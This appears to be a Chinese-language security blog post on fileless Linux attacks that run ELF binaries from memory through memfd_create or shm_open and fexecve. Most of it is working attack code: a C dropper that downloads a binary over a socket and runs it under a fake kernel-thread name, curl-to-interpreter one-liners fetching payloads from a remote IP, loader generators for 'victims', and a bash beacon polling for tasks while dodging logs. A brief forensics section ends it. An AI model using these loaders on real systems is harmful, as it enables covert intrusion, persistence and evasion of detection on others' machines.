# 0x00 无文件攻击(Linux)

持久控制、不落地种马、躲避检测。

## 1 整体思路

**step1**: 代码寄存。将核心代码放到远离目标的远端服务器上。

elf文件、命令、脚本语言代码。



**step2**: 加载代码到内存。

shm_open 创建共享内存文件，源于Linux进程间使用共享达到快速交换数据的思想。该文件存在于/dev/shm/或/tmpfs/目录下。

memfd_create 获取一个匿名文件并返回可供操作的文件描述符。该匿名文件存在于/proc/pid/fd/目录下。

基于shm_open的无文件攻击现在已经没人讨论了，隐身性较差。



**step3**: 调用运行。

libc提供了不少执行可执行文件的函数，这类函数常被称为execl函数族。fexecve是无文件攻击场景下最爱用的函数，给定一个文件描述符，它就能运行指向的文件。



### 1.1 公开进展

当前针对Linux的无文件攻击demo普遍要求目标设备上有一个已落地文件。这个落地文件是个加载器，用它加载真正需要运行的代码。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211202145901770.png)

#### 1.1.1 C码加载器

```c
//https://0x00sec.org/t/super-stealthy-droppers/3715
#include <stdio.h>
#include <stdlib.h>

#include <sys/syscall.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

extern char        **environ;

int main (int argc, char **argv) {
  int                fd, s;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"[kworker/u!0]", NULL};
  char               buf[1024];

  // Connect
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit (1);
  if (connect (s, (struct sockaddr*)&addr, 16) < 0) exit (1);
  if ((fd = memfd_create("a", MFD_CLOEXEC)) < 0) exit (1);

  while (1) {
      if ((read (s, buf, 1024) ) <= 0) break;
      write (fd, buf, 1024);
    }
  close (s);
  
  if (fexecve (fd, args, environ) < 0) exit (1);

  return 0;
    
}
```



#### 1.1.2 Python落地加载器

https://www.cnblogs.com/LittleHann/p/12049910.html#_label3_4_1_3

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211202151648960.png)

#### 1.1.3 Perl无文件加载器

https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html

```shell
cat ./elfload.pl | ssh user@target /bin/bash -c '"exec -a /sbin/iscsid perl"'
```

相对来说，三种姿势里面这种方式的无文件攻击隐蔽性最高。但是并不是每个人都对perl很熟，因此我研究了一下，实现了几种其他脚本语言的无文件攻击器。用它可以实现加载ELF、运行自定义命令。

## 2 Perl

perl版的代码最早来源于@magisterquis，国内不少关于这篇代码的分析都抄自”逢魔安全实验室“的分析。

https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html

实际上这份代码是目前最纯粹的无文件Linux攻击方案，代码非常之经典。它摆脱了加载器落地的问题，实现了真正的无文件。

### 无文件一句话

```shell
curl https://213.12.122.13:46379/py2e21ms20sm023sd320/core.pl|perl
```

### 服务器端部署

远程服务器上的待加载文件代码由三部分组成

**第一部分**

```shell
cat >> elfload.pl <<EOF
#!/usr/bin/env perl
use warnings;
use strict;

$l=1;
# Open a memory-backed file
print "Marking anonymous file...";
my $name = "";
my $fd = syscall(319,$name,1);
if (-1 == $fd) {
    die "memfd_create: $!";
}
print "fd $fd";

# Make a nice Perl file handle
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH),$l=1)[0]);

# Load binary into anonymous file (i. e. into memory)
print "Writing ELF binary to memory...";
EOF
```



**第二部分**

```shell
perl -e '$/=\32;print"print \$FH pack q/H*/, q".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' elfdemo >> elfload.pl
```



**第三部分**

```shell
cat >> elfload.pl <<EOF
print "done\n";

# Execute new program
print "Here we go...\n";
exec {"/proc/$$/fd/$fd"} "formsec"
        or die "exec: $!";
```



## 3 Python*

### 无文件一句话

```shell
curl -k -s "https://213.12.122.13:46379/ezNqxovBudSROFQgD3T26tmk7ar4ni/python/core.py" | python3 -c "for line in __import__('sys').stdin: exec(line)"
```

### 服务器端部署

1.示例加载器（部署在本地的elf内存加载器）

目标设备上访问本文件资源即可实现远程内存运行ELF。

```python
import ctypes
import os
binary = open('/usr/bin/ls','rb').read()
fd = ctypes.CDLL(None).syscall(319,"",1)
final_fd = open('/proc/self/fd/'+str(fd),'wb') 
final_fd.write(binary)
final_fd.close()
fork1 = os.fork()
if 0 != fork1: os._exit(0)
ctypes.CDLL(None).syscall(112)
fork2 = os.fork()
if 0 != fork2: os._exit(0)
os.execl('/proc/self/fd/'+str(fd),'argv0','-al')
```

2.远程木马加载器生成器

运行本python文件，生成python版的elf内存加载器，将生成的文件放在vps对应目录，供受害者使用一句话获取运行。

```python
import zlib
import binascii
import optparse

def read_file(filename):
    binarys=b""
    f=open(filename,"rb")
    for binary in f.readlines():
        binarys+=binary
    return binascii.b2a_hex(zlib.compress(binarys))

def create_loader(data):
    src1_code="data = %s" %(data)
    src2_code='''
import ctypes
import os
import zlib
import binascii
binary = zlib.decompress(binascii.a2b_hex(data))
fd = ctypes.CDLL(None).syscall(319,"",1)
final_fd = open('/proc/self/fd/'+str(fd),'wb') 
final_fd.write(binary)
final_fd.close()
fork1 = os.fork()
if 0 != fork1: os._exit(0)
ctypes.CDLL(None).syscall(112)
fork2 = os.fork()
if 0 != fork2: os._exit(0)
# execl 2参数设置进程名，3参数往后设置该elf的运行参数。
os.execl('/proc/self/fd/'+str(fd),'argv0','-al')
    '''
    with open('core.py', 'w') as f:
        f.writelines(src1_code)
        f.writelines(src2_code)
    
def main():
    parser = optparse.OptionParser('python3 create_core.py -f /usr/bin/ls' )
    parser.add_option('-f', '--file', dest = 'filename', type = 'string', help = 'set the file to be loaded.')
    (options,args) = parser.parse_args()
    filename=options.filename
    data = read_file(filename)
    create_loader(data)

if __name__ == '__main__':
    main()
```

## 4 Ruby*

### 无文件一句话

```shell
curl -k -s "https://213.12.122.13:46379/z9IWXokG3Td18w2EfyntRFMZsaec7P/ruby/core.rb" | ruby
```

### 服务器端部署

1.示例demo（部署在本地的elf内存加载器）

```ruby
fd = syscall 319,"",1
procd='/proc/self/fd/'+fd.to_s
f2 = File.open(procd,"wb")

f1 = File.open('/usr/bin/ping',"rb")
f1.each_line {|line|
    f2.write(line)
}
f1.close
f2.close

pid = Process.fork() {
	fd = syscall 112
	exec [procd, b'fakename'], '192.168.44.160'
}
exit
```

2.远程木马加载器生成器（部署在远程的加载器生成器）

运行本python文件，生成ruby版的elf内存加载器，将生成的文件放在vps对应目录，供受害者使用一句话获取运行。

```python
import zlib
import binascii
import optparse

def read_file(filename):
    binarys=b""
    f=open(filename,"rb")
    for binary in f.readlines():
        binarys+=binary
    return binascii.b2a_hex(binarys)

def create_loader(data):
    src1_code="data = \"%s\".scan(/../).map{|x| x.to_i(16)}.pack(\"c*\")" %(str(data, encoding="ascii"))
    src2_code='''
fd = syscall 319,"",1
procd='/proc/self/fd/'+fd.to_s
f2 = File.open(procd,"wb")

data.each_line {|line|
    f2.write(line)
    #print line
}

f2.close
pid = Process.fork() {
    fd = syscall 112
    exec [procd, 'fakename'], '192.168.44.160'
}
exit
    '''
    with open('core.rb', 'w') as f:
        f.writelines(src1_code)
        f.writelines(src2_code)
    
def main():
    parser = optparse.OptionParser('python3 create_core.py -f /usr/bin/ping' )
    parser.add_option('-f', '--file', dest = 'filename', type = 'string', help = 'set the file to be loaded.')
    (options,args) = parser.parse_args()
    filename=options.filename
    data = read_file(filename)
    create_loader(data)

if __name__ == '__main__':
    main()
```



## 5 Bash*

### 无文件加载器

```shell
curl -k -s https://213.12.122.13:46379/VsanWF70jtXvThCq5IrcfwiySARmoz/bash/do.sh|bash
```

### 服务器端部署

由于Bash不是一门完整的编程语言，没提供调用底层libc函数的方法，因此无法实现内存加载elf。但可以用它实现命令执行类的无文件攻击。

下面的脚本中，Bash定时向服务器获取任务执行。这种方式避免了传统定时任务在日志中留下痕迹的问题。缺点是重启失效。

```shell
#!/bin/bash
### >>>>> TASK_START
whoami > ./itworks
`cat ./task.sh`
### <<<<< TASK_END
sleep 10
curl -k -s https://213.12.122.13:46379/VsanWF70jtXvThCq5IrcfwiySARmoz/bash/do.sh|setsid bash &
```



## 6 C语言版

LoLBins in Linux Based C.

### 6.1 ELF加载器（共享内存）

```c
//gcc 1.c -lrt
//https://www.cnblogs.com/qiyeboy/p/12547204.html
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

static char *args[] = {
    "[ipv6_addrconf]",
	"192.168.44.1",
	NULL
};

extern char **environ;

int main(void) 
{
    struct stat st;
    void *p;
    int fd, shm_fd, rc;

    shm_fd = shm_open("pping", O_RDWR | O_CREAT, 0777);
    if (shm_fd == -1) {
	perror("shm_open");
	exit(1);
    }

    rc = stat("/usr/bin/ping", &st);
    if (rc == -1) {
	perror("stat");
	exit(1);
    }

    rc = ftruncate(shm_fd, st.st_size);
    if (rc == -1) {
	perror("ftruncate");
	exit(1);
    }

    p = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED,
	     shm_fd, 0);
    if (p == MAP_FAILED) {
	perror("mmap");
	exit(1);
    }

    fd = open("/usr/bin/ping", O_RDONLY, 0);
    if (fd == -1) {
	perror("openls");
	exit(1);
    }
    //复制fd对应文件的内容到p空间中
    rc = read(fd, p, st.st_size);
    if (rc == -1) {
	perror("read");
	exit(1);
    }
    if (rc != st.st_size) {
	fputs("Strange situation!\n", stderr);
	exit(1);
    }

    munmap(p, st.st_size);
    close(shm_fd);
    //执行该命令，fexecve的用法是通过文件描述符运行文件
    shm_fd = shm_open("pping", O_RDONLY, 0);
    fexecve(shm_fd, args, environ);
    perror("fexecve");
    return 0;
}
```

### 6.2  ELF加载器（syscall memfd_create）

功能性demo参考1.1.1即可。

地址：https://www.github.com/aplyc1a/ELFMemoryLoader.git

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194639514.png)

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194657845.png)

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194704757.png)

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194746933.png)

## 7 取证分析

由于Linux下一切皆文件的思想，因此实际还是存在一定的线索能够帮助分析是否使用了这类无文件攻击技术的。

1.Linux上部署能够检测memfd_create 调用的HI(DP)S主机安全类设备。

2.历史记录文件。

3.定位调用了memfd或使用了共享内存的进程。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211202172705582.png)

```shell
ls /proc/*/exe -al 2>/dev/null|grep "memfd\|/dev/shm"
```

